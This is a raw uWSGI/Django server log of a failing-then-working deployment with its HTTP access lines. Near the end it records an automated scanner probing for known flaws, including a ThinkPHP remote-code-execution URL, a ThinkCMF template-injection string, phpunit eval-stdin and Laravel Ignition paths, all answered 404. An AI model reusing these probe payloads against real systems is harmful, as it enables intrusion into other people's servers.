+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /srv/docker-server/django.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x5638d78241d0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+Traceback (most recent call last):
+  File "./server/wsgi.py", line 16, in <module>
+    application = get_wsgi_application()
+  File "/usr/local/lib/python3.8/site-packages/django/core/wsgi.py", line 12, in get_wsgi_application
+    django.setup(set_prefix=False)
+  File "/usr/local/lib/python3.8/site-packages/django/__init__.py", line 24, in setup
+    apps.populate(settings.INSTALLED_APPS)
+  File "/usr/local/lib/python3.8/site-packages/django/apps/registry.py", line 91, in populate
+    app_config = AppConfig.create(entry)
+  File "/usr/local/lib/python3.8/site-packages/django/apps/config.py", line 90, in create
+    module = import_module(entry)
+  File "/usr/local/lib/python3.8/importlib/__init__.py", line 127, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+ModuleNotFoundError: No module named 'django_inlinecss'
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 11, cores: 2)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Tue Mar 23 14:47:36 2021] ***
+compiled with version: 8.3.0 on 23 March 2021 14:46:46
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: e8a28058ed76
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/docker-server/django.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x5570a15fd200
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+Traceback (most recent call last):
+  File "./server/wsgi.py", line 16, in <module>
+    application = get_wsgi_application()
+  File "/usr/local/lib/python3.8/site-packages/django/core/wsgi.py", line 12, in get_wsgi_application
+    django.setup(set_prefix=False)
+  File "/usr/local/lib/python3.8/site-packages/django/__init__.py", line 24, in setup
+    apps.populate(settings.INSTALLED_APPS)
+  File "/usr/local/lib/python3.8/site-packages/django/apps/registry.py", line 91, in populate
+    app_config = AppConfig.create(entry)
+  File "/usr/local/lib/python3.8/site-packages/django/apps/config.py", line 90, in create
+    module = import_module(entry)
+  File "/usr/local/lib/python3.8/importlib/__init__.py", line 127, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+ModuleNotFoundError: No module named 'django_inlinecss'
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 8, cores: 2)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/1] 221.145.194.16 () {40 vars in 653 bytes} [Tue Mar 23 15:16:32 2021] POST /accounts/login/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/2] 221.145.194.16 () {40 vars in 653 bytes} [Tue Mar 23 15:17:41 2021] POST /accounts/login/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/3] 221.145.194.16 () {40 vars in 653 bytes} [Tue Mar 23 15:18:42 2021] POST /accounts/login/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/4] 221.145.194.16 () {40 vars in 653 bytes} [Tue Mar 23 15:19:09 2021] POST /accounts/login/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/5] 221.145.194.16 () {40 vars in 653 bytes} [Tue Mar 23 15:21:41 2021] POST /accounts/login/ => generated 21 bytes in 1 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/6] 221.145.194.16 () {40 vars in 653 bytes} [Tue Mar 23 15:21:44 2021] POST /accounts/login/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/7] 221.145.194.16 () {42 vars in 730 bytes} [Tue Mar 23 15:22:53 2021] POST /accounts/login/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/8] 221.145.194.16 () {42 vars in 730 bytes} [Tue Mar 23 15:23:01 2021] POST /accounts/login/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/9] 221.145.194.16 () {42 vars in 732 bytes} [Tue Mar 23 15:23:14 2021] POST /accounts/signup/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/10] 221.145.194.16 () {42 vars in 732 bytes} [Tue Mar 23 15:23:19 2021] POST /accounts/signup/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/11] 221.145.194.16 () {42 vars in 1508 bytes} [Tue Mar 23 15:26:10 2021] GET /swagger/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/12] 221.145.194.16 () {42 vars in 1457 bytes} [Tue Mar 23 15:26:10 2021] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/13] 221.145.194.16 () {44 vars in 1539 bytes} [Tue Mar 23 15:26:13 2021] GET /swagger/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/14] 221.145.194.16 () {46 vars in 1510 bytes} [Tue Mar 23 15:26:13 2021] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/15] 221.145.194.16 () {44 vars in 1539 bytes} [Tue Mar 23 15:26:15 2021] GET /swagger/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/16] 221.145.194.16 () {46 vars in 1510 bytes} [Tue Mar 23 15:26:15 2021] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/17] 221.145.194.16 () {44 vars in 1539 bytes} [Tue Mar 23 15:26:22 2021] GET /swagger/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/18] 221.145.194.16 () {46 vars in 1510 bytes} [Tue Mar 23 15:26:22 2021] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/19] 221.145.194.16 () {42 vars in 732 bytes} [Tue Mar 23 15:29:01 2021] POST /accounts/signup/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/20] 221.145.194.16 () {42 vars in 732 bytes} [Tue Mar 23 15:29:37 2021] POST /accounts/signup/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/21] 221.145.194.16 () {40 vars in 653 bytes} [Tue Mar 23 15:29:49 2021] POST /accounts/login/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/22] 221.145.194.16 () {42 vars in 732 bytes} [Tue Mar 23 15:47:51 2021] POST /accounts/signup/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/23] 60.191.125.35 () {36 vars in 574 bytes} [Tue Mar 23 15:53:56 2021] HEAD / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/24] 36.57.175.85 () {44 vars in 756 bytes} [Tue Mar 23 15:54:44 2021] HEAD / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/25] 221.145.194.16 () {42 vars in 731 bytes} [Tue Mar 23 16:09:20 2021] POST /accounts/signup/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/26] 221.145.194.16 () {42 vars in 731 bytes} [Tue Mar 23 16:09:21 2021] POST /accounts/signup/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 8|app: -1|req: -1/27] 221.145.194.16 () {42 vars in 732 bytes} [Tue Mar 23 16:24:10 2021] POST /accounts/signup/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 1)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Mar 24 00:13:16 2021] ***
+compiled with version: 8.3.0 on 24 March 2021 00:12:37
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: 105191f3ba1a
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/docker-server/django.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x562d06dd5200
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+Traceback (most recent call last):
+  File "./server/wsgi.py", line 16, in <module>
+    application = get_wsgi_application()
+  File "/usr/local/lib/python3.8/site-packages/django/core/wsgi.py", line 12, in get_wsgi_application
+    django.setup(set_prefix=False)
+  File "/usr/local/lib/python3.8/site-packages/django/__init__.py", line 24, in setup
+    apps.populate(settings.INSTALLED_APPS)
+  File "/usr/local/lib/python3.8/site-packages/django/apps/registry.py", line 91, in populate
+    app_config = AppConfig.create(entry)
+  File "/usr/local/lib/python3.8/site-packages/django/apps/config.py", line 90, in create
+    module = import_module(entry)
+  File "/usr/local/lib/python3.8/importlib/__init__.py", line 127, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+ModuleNotFoundError: No module named 'django_inlinecss'
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 8, cores: 2)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /srv/docker-server
+closing all non-uwsgi socket fds > 2 (max_fd = 1048576)...
+found fd 3 mapped to socket 0 (/srv/docker-server/django.sock)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Mar 24 00:24:33 2021] ***
+compiled with version: 8.3.0 on 24 March 2021 00:12:37
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: 105191f3ba1a
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /srv/docker-server/django.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x558b674d01d0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+Traceback (most recent call last):
+  File "./server/wsgi.py", line 16, in <module>
+    application = get_wsgi_application()
+  File "/usr/local/lib/python3.8/site-packages/django/core/wsgi.py", line 12, in get_wsgi_application
+    django.setup(set_prefix=False)
+  File "/usr/local/lib/python3.8/site-packages/django/__init__.py", line 24, in setup
+    apps.populate(settings.INSTALLED_APPS)
+  File "/usr/local/lib/python3.8/site-packages/django/apps/registry.py", line 91, in populate
+    app_config = AppConfig.create(entry)
+  File "/usr/local/lib/python3.8/site-packages/django/apps/config.py", line 90, in create
+    module = import_module(entry)
+  File "/usr/local/lib/python3.8/importlib/__init__.py", line 127, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+ModuleNotFoundError: No module named 'django_inlinecss'
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 11, cores: 2)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Mar 24 05:22:04 2021] ***
+compiled with version: 8.3.0 on 24 March 2021 05:16:51
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: 0c46282b11ba
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/docker-server/apps.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x55ddcb290320
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55ddcb290320 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 10, cores: 2)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /srv/docker-server
+closing all non-uwsgi socket fds > 2 (max_fd = 1048576)...
+found fd 3 mapped to socket 0 (/srv/docker-server/apps.sock)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Mar 24 05:23:32 2021] ***
+compiled with version: 8.3.0 on 24 March 2021 05:16:51
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: 0c46282b11ba
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /srv/docker-server/apps.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x55c99edeb2f0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55c99edeb2f0 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 13, cores: 2)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Mar 24 05:23:41 2021] ***
+compiled with version: 8.3.0 on 24 March 2021 05:22:51
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: f51670579935
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/docker-server/apps.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x555d86828320
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x555d86828320 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 8, cores: 2)
+Not Found: /
+[pid: 8|app: 0|req: 1/1] 220.123.151.127 () {46 vars in 1217 bytes} [Wed Mar 24 05:24:15 2021] GET / => generated 2797 bytes in 354 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 8|app: 0|req: 2/2] 220.123.151.127 () {46 vars in 1161 bytes} [Wed Mar 24 05:24:15 2021] GET /favicon.ico => generated 2848 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 8|app: 0|req: 3/3] 220.123.151.127 () {44 vars in 1182 bytes} [Wed Mar 24 05:24:29 2021] GET / => generated 2797 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 4/4] 220.123.151.127 () {46 vars in 1229 bytes} [Wed Mar 24 05:24:30 2021] GET / => generated 2797 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 8|app: 0|req: 5/5] 220.123.151.127 () {44 vars in 1074 bytes} [Wed Mar 24 05:24:51 2021] GET / => generated 2797 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 8|app: 0|req: 6/6] 220.123.151.127 () {42 vars in 1007 bytes} [Wed Mar 24 05:24:52 2021] GET /favicon.ico => generated 2848 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 8|app: 0|req: 7/7] 220.123.151.127 () {46 vars in 1128 bytes} [Wed Mar 24 05:24:52 2021] GET / => generated 2797 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 8/8] 220.123.151.127 () {44 vars in 1086 bytes} [Wed Mar 24 05:24:59 2021] GET /admin/ => generated 0 bytes in 11 msecs (HTTP/1.1 302) 9 headers in 339 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 9/9] 220.123.151.127 () {44 vars in 1123 bytes} [Wed Mar 24 05:24:59 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 30 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 10/10] 220.123.151.127 () {42 vars in 1062 bytes} [Wed Mar 24 05:25:00 2021] GET /admin/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 9 headers in 339 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 11/11] 220.123.151.127 () {42 vars in 1099 bytes} [Wed Mar 24 05:25:00 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 14 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 12/12] 220.123.151.127 () {44 vars in 773 bytes} [Wed Mar 24 05:25:29 2021] POST /accounts/check/email/ => generated 25 bytes in 3546 msecs (HTTP/1.1 201) 7 headers in 214 bytes (1 switches on core 1)
+Not Found: /api/jsonws/invoke
+[pid: 8|app: 0|req: 13/13] 45.146.165.157 () {38 vars in 598 bytes} [Wed Mar 24 05:32:22 2021] POST /api/jsonws/invoke => generated 2864 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[pid: 8|app: 0|req: 14/14] 45.146.165.157 () {38 vars in 700 bytes} [Wed Mar 24 05:32:22 2021] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 2963 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[pid: 8|app: 0|req: 16/15] 45.146.165.157 () {36 vars in 612 bytes} [Wed Mar 24 05:32:23 2021] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 2962 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /solr/admin/info/system
+[pid: 8|app: 0|req: 16/16] 45.146.165.157 () {34 vars in 544 bytes} [Wed Mar 24 05:32:23 2021] GET /solr/admin/info/system?wt=json => generated 2886 bytes in 6 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /index.php
+[pid: 8|app: 0|req: 17/17] 45.146.165.157 () {34 vars in 708 bytes} [Wed Mar 24 05:32:23 2021] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 => generated 2958 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 18/18] 45.146.165.157 () {36 vars in 641 bytes} [Wed Mar 24 05:32:23 2021] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 2858 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /wp-content/plugins/wp-file-manager/readme.txt
+[pid: 8|app: 0|req: 19/19] 45.146.165.157 () {34 vars in 575 bytes} [Wed Mar 24 05:32:24 2021] GET /wp-content/plugins/wp-file-manager/readme.txt => generated 2947 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /console/
+[pid: 8|app: 0|req: 20/20] 45.146.165.157 () {34 vars in 501 bytes} [Wed Mar 24 05:32:24 2021] GET /console/ => generated 2836 bytes in 3 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /Autodiscover/Autodiscover.xml
+[pid: 8|app: 0|req: 21/21] 45.146.165.157 () {38 vars in 624 bytes} [Wed Mar 24 05:32:24 2021] POST /Autodiscover/Autodiscover.xml => generated 2900 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 22/22] 45.146.165.157 () {34 vars in 544 bytes} [Wed Mar 24 05:32:24 2021] GET /?XDEBUG_SESSION_START=phpstorm => generated 2824 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /_ignition/execute-solution
+[pid: 8|app: 0|req: 23/23] 45.146.165.157 () {36 vars in 590 bytes} [Wed Mar 24 05:32:26 2021] GET /_ignition/execute-solution => generated 2890 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 24/24] 220.123.151.127 () {44 vars in 1182 bytes} [Wed Mar 24 05:32:55 2021] GET / => generated 2797 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
